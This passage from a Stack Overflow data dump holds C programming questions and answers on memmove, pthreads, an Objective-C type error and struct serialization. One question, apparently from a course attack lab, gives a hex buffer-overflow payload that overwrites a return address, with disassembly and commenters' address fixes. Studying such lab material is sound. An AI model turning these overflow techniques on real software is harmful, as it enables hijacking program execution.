sizeof(buf)-offset-copiedSoFar);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 4790, "user_id": 3991344, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/55Z1r.png?s=128&g=1", "display_name": "Pokechu22", "link": "https://stackoverflow.com/users/3991344/pokechu22"}, "edited": false, "score": 1, "creation_date": 1476294340, "post_id": 40001231, "comment_id": 67288067, "body": "I don&#39;t do much with C, but wouldn&#39;t <code>sizeof data_copy</code> in your compound literals example have to be <code>sizeof original_data</code>, since <code>data_copy</code> no longer exists?"}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 1, "creation_date": 1476310941, "post_id": 40001231, "comment_id": 67296781, "body": "Of course, the example with strcat will be brilliantly inefficient since each strcat operation will start by scanning the destination to find the null byte, then concatenate the new data, and then return the <i>start</i> of the destination so the next call will have to scan through both the old and new data to find the new location of the zero byte."}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "reply_to_user": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 1, "creation_date": 1476312330, "post_id": 40001231, "comment_id": 67297238, "body": "@supercat: Yes, it is probably safe to say that <code>strcat</code> is a useless function. It is used in my answer for purely illustrative purposes."}], "tags": [], "owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "is_accepted": false, "score": 13, "last_activity_date": 1480651791, "last_edit_date": 1480651791, "creation_date": 1476282517, "answer_id": 40001231, "question_id": 39999903, "link": "https://stackoverflow.com/questions/39999903/can-memcpy-or-memmove-return-a-different-pointer-than-dest/40001231#40001231", "title": "Can memcpy or memmove return a different pointer than dest?", "body": "<p>The idiom of returning the exact value of one of the arguments (of pointer type) exists in order to support \"chained\" function calls (also see <code>strcpy</code>, <code>strcat</code> etc). It allows you to write some repetitive code as a single expression statement instead of splitting it into multiple statements. For example</p>\n\n<pre><code>char buffer[1024];\nprintf(\"%s\\n\", strcat(strcat(strcpy(buffer, \"Hello\"), \" \"), \"World\"));\n\nstruct UserData data_copy;\nsome_function(memcpy(&amp;data_copy, &amp;original_data, sizeof original_data));\n</code></pre>\n\n<p>Even if you don't like this style of organizing code and prefer doing the same through multiple statements, the overhead of returning an [unnecessary] pointer value is virtually non-existent.</p>\n\n<p>One can even say that the value of this idiom increased a bit after the introduction of <em>compound literals</em> in C99. With compound lterals this very idiom allows one to write the same code without introducing a named intermediate variable</p>\n\n<pre><code>printf(\"%s\\n\", strcat(strcat(strcpy((char [1024]) { 0 }, \"Hello\"), \" \"), \"World!\"));\n\nsome_function(memcpy(&amp;(struct UserData) { 0 }, &amp;original_data, sizeof original_data));\n</code></pre>\n\n<p>which makes sense since in most cases that named variable is supposed to be short-lived, is not needed afterwards, and only clutters the namespace.</p>\n"}], "owner": {"reputation": 7113, "user_id": 653152, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/HoFfR.jpg?s=128&g=1", "display_name": "Martin Ueding", "link": "https://stackoverflow.com/users/653152/martin-ueding"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3102, "favorite_count": 3, "accepted_answer_id": 40000095, "answer_count": 3, "score": 39, "last_activity_date": 1480651791, "creation_date": 1476278915, "last_edit_date": 1476279328, "question_id": 39999903, "link": "https://stackoverflow.com/questions/39999903/can-memcpy-or-memmove-return-a-different-pointer-than-dest", "title": "Can memcpy or memmove return a different pointer than dest?", "body": "<p>The function <code>memmove</code> is defined like this:</p>\n\n<pre><code>void *memmove(void *dest, const void *src, size_t n);\n</code></pre>\n\n<p>In the Linux manual page, it says:</p>\n\n<blockquote>\n  <p>RETURN VALUE<br>\n  The memmove() function returns a pointer to dest.</p>\n</blockquote>\n\n<p>Why isn't the function just defined as <code>void memmove(\u2026)</code> when it always returns one of the input parameters? Can the return value be different from <code>dest</code>?</p>\n\n<p>Or is the return value really always <code>dest</code> and it is just done to be able to compose the function in some creative ways?</p>\n"}, {"tags": ["c", "multithreading", "pthreads"], "comments": [{"owner": {"reputation": 6463, "user_id": 6387170, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d425edf9cc20e61c8cc3be162915f06?s=128&d=identicon&r=PG&f=1", "display_name": "UKMonkey", "link": "https://stackoverflow.com/users/6387170/ukmonkey"}, "edited": false, "score": 1, "creation_date": 1476277826, "post_id": 39999358, "comment_id": 67276614, "body": "I don&#39;t think you&#39;re meant to be calculating pi twice with 2 threads, but getting the threads to add more data points so that your 1 estimate of pi is more accurate.  For this your threads must access a shared resource.  To be able to do that safely you&#39;ll need a mutex.  I leave it as an exercise to the OP to read up about what they are."}, {"owner": {"reputation": 2048, "user_id": 4961259, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9b82c25cbde4d52888e6eccc44764b80?s=128&d=identicon&r=PG&f=1", "display_name": "Kami Kaze", "link": "https://stackoverflow.com/users/4961259/kami-kaze"}, "edited": false, "score": 3, "creation_date": 1476278151, "post_id": 39999358, "comment_id": 67276844, "body": "Just copying the assignment you got and you code is not gonna help you here. You better try to analyze where your problem is and be more specific about it."}, {"owner": {"reputation": 25770, "user_id": 5349916, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/QovYv.jpg?s=128&g=1", "display_name": "MisterMiyagi", "link": "https://stackoverflow.com/users/5349916/mistermiyagi"}, "reply_to_user": {"reputation": 6463, "user_id": 6387170, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d425edf9cc20e61c8cc3be162915f06?s=128&d=identicon&r=PG&f=1", "display_name": "UKMonkey", "link": "https://stackoverflow.com/users/6387170/ukmonkey"}, "edited": false, "score": 0, "creation_date": 1476324708, "post_id": 39999358, "comment_id": 67300310, "body": "@UKMonkey It&#39;s a common approach to calculate it multiple times (1 per thread), then take the average. This also directly provides an estimate for the accuracy of the result."}], "answers": [{"tags": [], "owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "is_accepted": false, "score": 1, "last_activity_date": 1476279731, "last_edit_date": 1476279731, "creation_date": 1476279398, "answer_id": 40000100, "question_id": 39999358, "link": "https://stackoverflow.com/questions/39999358/how-to-use-pthreading-in-c/40000100#40000100", "title": "How to use pthreading in C", "body": "<p>Since this is clearly homework I will only provide pseudo code (I don't want to take away your learning experience). Here are some pointers on how you could solve the excercise:</p>\n\n<p>Global variables:</p>\n\n<p><code>long total</code> - the number of iterations per thread (can also be a <code>#define</code>).</p>\n\n<p><code>long K</code> - Must be larger than the highest thread identifier.</p>\n\n<p><code>long count[K]</code> - Thread counters. Each thread will update it's counter with the number of random points that were inside the circle.</p>\n\n<p>Main:</p>\n\n<ol>\n<li>Set a value for <code>total</code> (could be global volatile variable).</li>\n<li>create threads</li>\n<li>Wait for threads </li>\n<li>Sum results</li>\n<li>Print total result</li>\n</ol>\n\n<p>Thread:</p>\n\n<ol>\n<li>Loop <code>total</code> times</li>\n<li>For each loop iteration, generate a random point and add the result of <code>checkvalue</code> to the count for the thread. </li>\n</ol>\n\n<p>Note:</p>\n\n<p>Each thread should have a separate count variable (for example in a global array using the thread identifier number as index). You don't  need to store the result for each point, just the count. If they would use the same count variable, access to it would have to be synchronized, and that would decrease performance.</p>\n\n<p>Note 2:</p>\n\n<p>The use of global variables is not really the best way to handle communication with the threads. It is, however, the easiest way, so for a beginning thread programmer it is good enough.</p>\n"}], "owner": {"reputation": 1, "user_id": 6820832, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d0dc8294a257ad623da3b6eda4328ab?s=128&d=identicon&r=PG&f=1", "display_name": "softballgirl12", "link": "https://stackoverflow.com/users/6820832/softballgirl12"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 722, "favorite_count": 0, "closed_date": 1476324721, "answer_count": 1, "score": 0, "last_activity_date": 1476279731, "creation_date": 1476277491, "question_id": 39999358, "link": "https://stackoverflow.com/questions/39999358/how-to-use-pthreading-in-c", "closed_reason": "Needs details or clarity", "title": "How to use pthreading in C", "body": "<p>I was given this question to solve using multithreading:</p>\n\n<p>An interesting way of calculating \u03c0 (pi) is to use a technique known as Monte Carlo, which involves randomization.  This technique works as follows:  Suppose you have a circle inscribed within a square, as shown below.  Assume that the radius of this circle is 1.  First, generate a series of random points as simple (x, y) coordinates.  These points must fall within the Cartesian coordinates that bound the square.  Of the total number of random points that are generated, some will occur within the circle.  </p>\n\n<p><a href=\"https://i.stack.imgur.com/080UJ.png\" rel=\"nofollow\">visual of circle</a></p>\n\n<p>Next, estimate \u03c0 (pi) by performing the following calculation:\n\u03c0 = 4 x (number of points in circle) / (total number of points)</p>\n\n<p>Write a multithreaded version of this algorithm in C that uses pthreads to create one or more separate threads to generate a number of random points.  The thread will count the number of points that occur within the circle and store that result in a global variable.  When this thread has exited, the parent thread will calculate and output the estimated value of \u03c0 (pi).  It is worth experimenting with the number of random points generated.  As a general rule, the greater the number of points, the closer the approximation to \u03c0 (pi).  </p>\n\n<p>I feel like I am close to getting this but I need some help. here is my code:</p>\n\n<pre><code>#include &lt;stdlib.h&gt; // For random(), RAND_MAX\n#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include &lt;pthread.h&gt;\n#define total 1200\n\nint checkvalue(int r, float x, float y)\n{\n    float dis,d;\n    int count = 0;\n    //Considering center as (0,0) as per the picture\n    dis = x*x + y*y;\n    d = r*r;\n    if(dis == d)\n    {\n        printf(\"\\nPoint is on the circle\\n\");\n        return 1;\n    }\n    else\n    {\n        if(dis&gt;d)\n        {\n            printf(\"Point is outside the circle\\n\");\n            return 0;\n        }\n        else\n        {\n            printf(\"Point is inside the circle\\n\");\n            return 1;\n        }\n\n    }\n\n    return 0;\n}\n\nvoid* CalPi(void* data)\n{\n    int me = *((int*)data);\n    int max = 1, min = -1,r,p,count = 0;\n    float x[total], y[total],pi;\n\n    //Radius given is 1\n    r = 1;\n    /* thread identifying number */ // put the entire logic over here to get the co-ordinates (randomly) and checking them based on the conditions we\n    for(int i = 0; i&lt; total; i++)\n    {\n        x[i] = (2 * ((float)rand()/RAND_MAX) - 1) ;\n    }\n    for(int i = 0; i&lt; total; i++)\n    {\n        y[i] = (2 * ((float)rand()/RAND_MAX) - 1) ;\n    }\n    printf(\"Point are :\");\n    for(int i = 0; i&lt; total; i++)\n    {\n        printf(\"(%f,%f)\\n\", x[i],y[i]);\n    }\n    for(int i = 0; i&lt; total; i++)\n    {\n        p = checkvalue(r,x[i],y[i]);\n        if (p == 1)\n        {\n            printf(\"Point : (%f,%f)\\n\",x[i],y[i]);\n            count = count + 1;\n        }\n    }\n    printf(\"count = %d\", count);\n    pi = (float) 4 * (count / (total * 1.0));\n    printf(\"\\nThe value of pi : %f \", pi);\n\n}\n\nvoid main()\n{\n    int thread_id; pthread_t thread_val; //thread's structure\n    int t1 = 1; // thread 1 identifying number\n    int t2 = 2; //Creating a new thread which will execute 'CalPi()'\n    thread_id = pthread_create(&amp;thread_val, NULL, CalPi, (void*)&amp;t1); // executing 'CalPi()' in the main thread as well\n    CalPi((void*)&amp;t2);\n\n    }\n</code></pre>\n"}, {"tags": ["objective-c", "c"], "comments": [{"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1476277468, "post_id": 39999105, "comment_id": 67276374, "body": "Is this the <i>exact</i> code you are using?  There may be some mis-spelling.  (checkconneciton ?)"}, {"owner": {"reputation": 12147, "user_id": 4244136, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6ee698ef15036e2393a30962db90cfa3?s=128&d=identicon&r=PG&f=1", "display_name": "Willeke", "link": "https://stackoverflow.com/users/4244136/willeke"}, "edited": false, "score": 1, "creation_date": 1476277556, "post_id": 39999105, "comment_id": 67276425, "body": "<code>TestConnection</code> returns <code>const char</code> and <code>stringWithUTF8String</code> wants <code>const char *</code>."}, {"owner": {"reputation": 435, "user_id": 5998656, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/2Kj8J.jpg?s=128&g=1", "display_name": "Snowman08", "link": "https://stackoverflow.com/users/5998656/snowman08"}, "reply_to_user": {"reputation": 12147, "user_id": 4244136, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6ee698ef15036e2393a30962db90cfa3?s=128&d=identicon&r=PG&f=1", "display_name": "Willeke", "link": "https://stackoverflow.com/users/4244136/willeke"}, "edited": false, "score": 0, "creation_date": 1476278224, "post_id": 39999105, "comment_id": 67276905, "body": "Could you demonstrate how I would fix this @Willeke"}, {"owner": {"reputation": 435, "user_id": 5998656, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/2Kj8J.jpg?s=128&g=1", "display_name": "Snowman08", "link": "https://stackoverflow.com/users/5998656/snowman08"}, "reply_to_user": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1476278249, "post_id": 39999105, "comment_id": 67276922, "body": "Yes I had some spelling mistakes they are fixed now @ryyker"}], "answers": [{"tags": [], "owner": {"reputation": 160387, "user_id": 25646, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4bb7953f53aa7715c72054c3d54e7b48?s=128&d=identicon&r=PG", "display_name": "bbum", "link": "https://stackoverflow.com/users/25646/bbum"}, "is_accepted": true, "score": 1, "last_activity_date": 1476296689, "creation_date": 1476296689, "answer_id": 40005792, "question_id": 39999105, "link": "https://stackoverflow.com/questions/39999105/how-to-set-objective-c-label-with-cons-char-function-in-c/40005792#40005792", "title": "How to set objective c label with cons char function in c", "body": "<p><code>TestConnection</code> is defined as returning a single character, not a string.</p>\n\n<p>It needs to return a string -- <code>const char *</code> -- which can then be used to initialize the <code>NSString</code>.</p>\n"}], "owner": {"reputation": 435, "user_id": 5998656, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/2Kj8J.jpg?s=128&g=1", "display_name": "Snowman08", "link": "https://stackoverflow.com/users/5998656/snowman08"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 80, "favorite_count": 0, "accepted_answer_id": 40005792, "answer_count": 1, "score": 0, "last_activity_date": 1476296689, "creation_date": 1476276802, "question_id": 39999105, "link": "https://stackoverflow.com/questions/39999105/how-to-set-objective-c-label-with-cons-char-function-in-c", "title": "How to set objective c label with cons char function in c", "body": "<p>I want to run my function TestConnection(const char) and set the value from it for my label in objective c. Any help would be greatly apprecitated I keep getting this error \"Incompatible integer to pointer conversion sending 'char' to parameter of type 'const char *_Nonull' in xcode.  </p>\n\n<p>Here is my c code </p>\n\n<p>fucn.c </p>\n\n<pre><code>const char TestConnection(const char *ip)\n{\n    //char ipAddr[] = \"133.131.232.131\";\n    char *val = P(ip);\n    char *valb = \"0packets\";\n    if(strcmp(val, valb) == 0)\n    {\n        printf(\"%s\\n\", \"noconnection\");\n        //return \"noconneciton\";\n    }\n    else\n    {\n        printf(\"%s\\n\", \"connected\");\n        //return \"connected\";\n    }\n    return *val;\n}\n</code></pre>\n\n<p>func.h </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdbool.h&gt;\n\nconst char TestConnection(const char *ip);\n</code></pre>\n\n<p>objective c code Viewcont.m</p>\n\n<pre><code>- (void)checkconneciton:(NSString*)ip {\n    const char *ipc = [ip UTF8String];\n    //TestConnection(ipc);\n\n    //below is the line with the error. \n    NSString* xx = [NSString stringWithUTF8String:TestConnection(ipc)];\n    _ip_label.stringValue = xx;\n\n}\n</code></pre>\n"}, {"tags": ["c", "assembly", "buffer-overflow"], "comments": [{"owner": {"reputation": 547, "user_id": 2486127, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/009fa959a9baff98ef3f790f5d271827?s=128&d=identicon&r=PG", "display_name": "invictus1306", "link": "https://stackoverflow.com/users/2486127/invictus1306"}, "edited": false, "score": 0, "creation_date": 1476278699, "post_id": 39998849, "comment_id": 67277244, "body": "It is a 64 bit binary? please attach also registers info and stack dump"}, {"owner": {"reputation": 547, "user_id": 2486127, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/009fa959a9baff98ef3f790f5d271827?s=128&d=identicon&r=PG", "display_name": "invictus1306", "link": "https://stackoverflow.com/users/2486127/invictus1306"}, "edited": false, "score": 0, "creation_date": 1476287073, "post_id": 39998849, "comment_id": 67283524, "body": "if 64 bit, try this 60 19 40 00 ff ff ff ff"}, {"owner": {"reputation": 547, "user_id": 2486127, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/009fa959a9baff98ef3f790f5d271827?s=128&d=identicon&r=PG", "display_name": "invictus1306", "link": "https://stackoverflow.com/users/2486127/invictus1306"}, "edited": false, "score": 0, "creation_date": 1476960284, "post_id": 39998849, "comment_id": 67573235, "body": "Sorry, only now I have seen my previous comment, try this as  8 bytes address -&gt; 60 19 40 00 ff ff ff 7f"}], "owner": {"reputation": 1933, "user_id": 5449456, "user_type": "registered", "accept_rate": 52, "profile_image": "https://lh5.googleusercontent.com/-2pNZV5O6iBo/AAAAAAAAAAI/AAAAAAAAAEk/eEtyVSBbwSk/photo.jpg?sz=128", "display_name": "Kendall Weihe", "link": "https://stackoverflow.com/users/5449456/kendall-weihe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 154, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1476275994, "creation_date": 1476275994, "question_id": 39998849, "link": "https://stackoverflow.com/questions/39998849/buffer-overflow-old-rbp-space-and-return-space", "title": "Buffer overflow -- old rbp space and return space", "body": "<p>I have a program (<code>ctarget</code>) that uses the <code>gets()</code> function into a buffer. I need to overflow the buffer and call another program. From the assembly code (I don't have the source code) I can see the size of the stack allocation (0x38):</p>\n\n<pre><code>000000000040194a &lt;getbuf&gt;:\n  40194a:   48 83 ec 38             sub    $0x38,%rsp\n  40194e:   48 89 e7                mov    %rsp,%rdi\n  401951:   e8 8a 02 00 00          callq  401be0 &lt;Gets&gt;\n  401956:   b8 01 00 00 00          mov    $0x1,%eax\n  40195b:   48 83 c4 38             add    $0x38,%rsp\n  40195f:   c3                      retq  \n</code></pre>\n\n<p>I have another program (<code>hex2raw</code>) that reads in a text file and converts hex characters to raw binary data. So I have the following in <code>exploit1.txt</code></p>\n\n<pre><code>00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00\n/* at this point there is no seg fault */\n00 00 00 00 00 00 00 00 /* 8 byte old rbp */\n60 19 40 00 00 00 00 00 /* 8 bytes address */\n</code></pre>\n\n<p>The leading zeros are padding the buffer. I've made a comment at the point in which the program does not seg fault. I've added 8 more bytes to fill in the <code>old %rbp</code> place on the stack. Lastly, I've added the address of the desired function into (what is supposed to be) the return space -- in little endian order.</p>\n\n<p>Using the <code>hex2raw</code> program I can execute the program with the following command: <code>./hex2raw &lt; exploit1.txt | ./ctarget</code></p>\n\n<p>When I do run with the above, I get a seg fault.</p>\n\n<p>Here is the assembly for the function I'm trying to call:</p>\n\n<pre><code>0000000000401960 &lt;touch1&gt;:\n  401960:   48 83 ec 08             sub    $0x8,%rsp\n  401964:   c7 05 ae 3b 20 00 01    movl   $0x1,0x203bae(%rip)        # 60551c &lt;vlevel&gt;\n  40196b:   00 00 00 \n  40196e:   bf 6a 32 40 00          mov    $0x40326a,%edi\n  401973:   e8 68 f3 ff ff          callq  400ce0 &lt;puts@plt&gt;\n  401978:   bf 01 00 00 00          mov    $0x1,%edi\n  40197d:   e8 b4 04 00 00          callq  401e36 &lt;validate&gt;\n  401982:   bf 00 00 00 00          mov    $0x0,%edi\n  401987:   e8 e4 f4 ff ff          callq  400e70 &lt;exit@plt&gt;\n</code></pre>\n\n<p>What do I have wrong? </p>\n\n<p>I'm given the functions <code>getbuf()</code> and <code>touch1()</code> if it helps:</p>\n\n<pre><code>  4 int getbuf() {\n  6     char buf[BUFFER_SIZE];\n  7     Gets(buf);\n  8     return 1;\n  9 }\n\nvoid touch1() {\n    vlevel = 1;       /* Part of validation protocol */\n    printf(\"Touch1!: You called touch1()\\n\");\n    validate(1);\n    exit(0);\n}\n</code></pre>\n"}, {"tags": ["c", "memory", "struct", "embedded"], "comments": [{"owner": {"reputation": 1585, "user_id": 421550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e7a2292ef4ad3674b556df31e81efce?s=128&d=identicon&r=PG", "display_name": "domen", "link": "https://stackoverflow.com/users/421550/domen"}, "edited": false, "score": 0, "creation_date": 1476279888, "post_id": 39998805, "comment_id": 67278208, "body": "I&#39;m a bit confused reading this, so I&#39;m probably misunderstanding something. Why do you deal with offsets in the first place? You&#39;d never do that if it was only in RAM (see <code>memcpy(*dest, *src, size)</code>). A simple way is to copy to RAM on init, then commit to NV on change/whenever. When committing treat it as an array of bytes (but do pay attention to padding issues here), or parse the struct."}, {"owner": {"reputation": 2127, "user_id": 1819452, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/3ad224b55add66c22f62380dea203e75?s=128&d=identicon&r=PG", "display_name": "Vroomfondel", "link": "https://stackoverflow.com/users/1819452/vroomfondel"}, "edited": false, "score": 0, "creation_date": 1476281214, "post_id": 39998805, "comment_id": 67279240, "body": "It would be valuable to know whether your storage is large enough to hold a complete filesystem (as primitive as it needs to be) or if there are just some 512 bytes or somesuch of EEPROM. Plus if your RAM allows buffering of the entire structure. Holding data as hierarchical database w/o further formatting will be very messy and unstable."}, {"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "reply_to_user": {"reputation": 1585, "user_id": 421550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e7a2292ef4ad3674b556df31e81efce?s=128&d=identicon&r=PG", "display_name": "domen", "link": "https://stackoverflow.com/users/421550/domen"}, "edited": false, "score": 0, "creation_date": 1476281669, "post_id": 39998805, "comment_id": 67279542, "body": "@domen added further explanation - does it help?"}, {"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "reply_to_user": {"reputation": 2127, "user_id": 1819452, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/3ad224b55add66c22f62380dea203e75?s=128&d=identicon&r=PG", "display_name": "Vroomfondel", "link": "https://stackoverflow.com/users/1819452/vroomfondel"}, "edited": false, "score": 0, "creation_date": 1476281704, "post_id": 39998805, "comment_id": 67279560, "body": "@Vroomfondel does the added information help?"}, {"owner": {"reputation": 1585, "user_id": 421550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e7a2292ef4ad3674b556df31e81efce?s=128&d=identicon&r=PG", "display_name": "domen", "link": "https://stackoverflow.com/users/421550/domen"}, "edited": false, "score": 0, "creation_date": 1476282123, "post_id": 39998805, "comment_id": 67279883, "body": "If you&#39;re just plainly copying structs, use something memcpy-like and ignore the bytes that don&#39;t change. Other idea is to copy from <code>foo-&gt;bar</code> to nvram position <code>struct_offset + offsetof(struct ss, bar)</code> with size <code>sizeof(foo-&gt;bar)</code>. With multiple nested structs, you might need to use multiple <code>offsetof()</code>, or something ugly like <code>(size_t)&amp;((struct ss*)NULL)-&gt;bar</code>."}], "answers": [{"comments": [{"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 1, "creation_date": 1476280352, "post_id": 40000306, "comment_id": 67278605, "body": "Kudos for a well written answer. BUT, if I had a PC-type environment and associated space I wouldn&#39;t be down this route in the first place. Memory requirements for storing all that extra ASCII encoded, plus the code and processing time required to parse and encoded clear-text data makes this an immediate non-starter for an embedded environment though (I don&#39;t even have a file system!)."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1476280408, "post_id": 40000306, "comment_id": 67278640, "body": "@Toby No, the point is that you use the script to  generate source code files, and include them in your build."}, {"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1476281780, "post_id": 40000306, "comment_id": 67279617, "body": "Ah, sorry I misread the first time - interesting"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 1, "creation_date": 1476282248, "post_id": 40000306, "comment_id": 67279979, "body": "@Toby I&#39;d like to add that I have travelled this path: First using structures, then handwritten tables in c source files, and finally script generated tables. In hindsight, I would have saved a lot of time in the long run skipping the first 2."}, {"owner": {"reputation": 2127, "user_id": 1819452, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/3ad224b55add66c22f62380dea203e75?s=128&d=identicon&r=PG", "display_name": "Vroomfondel", "link": "https://stackoverflow.com/users/1819452/vroomfondel"}, "edited": false, "score": 1, "creation_date": 1476283532, "post_id": 40000306, "comment_id": 67280906, "body": "What user694733 (couldn&#39;t ya choose some nicer name, eh?) says is spot on. Your problem doesn&#39;t seem to have any levels of abstraction to exploit, it seems you have to rd/wr everything from everywhere in every combination. Trying to handle this in handwritten code will lead you straight into maintenance hell even while developing. Go for a managed approach with a tabular tool (even some spreadsheet will do better than C source). And insert a generation id to the struct to convert from older layouts to latest when a binary with a new struct meets old FRAM."}], "tags": [], "owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "is_accepted": true, "score": 1, "last_activity_date": 1476279985, "creation_date": 1476279985, "answer_id": 40000306, "question_id": 39998805, "link": "https://stackoverflow.com/questions/39998805/common-interface-pattern-for-writing-struct-members-to-memory/40000306#40000306", "title": "Common interface pattern for writing struct members to memory?", "body": "<p>Don't use structures for serialization.</p>\n\n<p>Instead, define your setting variables in clear text data files (CSV, JSON, XML, ...):</p>\n\n<pre><code>ID,  TYPE,   DEFAULT\nFoo, int32,      120\nBar, float,     40.0 \n</code></pre>\n\n<p>Then convert that data file to source files using the scripting language of your choice. You can determine needed size from the types, and calculate NV memory offsets automatically to an table.</p>\n\n<p>One of the files that your script spits out is a list of ID's:</p>\n\n<pre><code>typedef enum {\n    ID_Foo,\n    ID_Bar,\n    ID_COUNT\n} ID_T;\n</code></pre>\n\n<p>And API you offer is 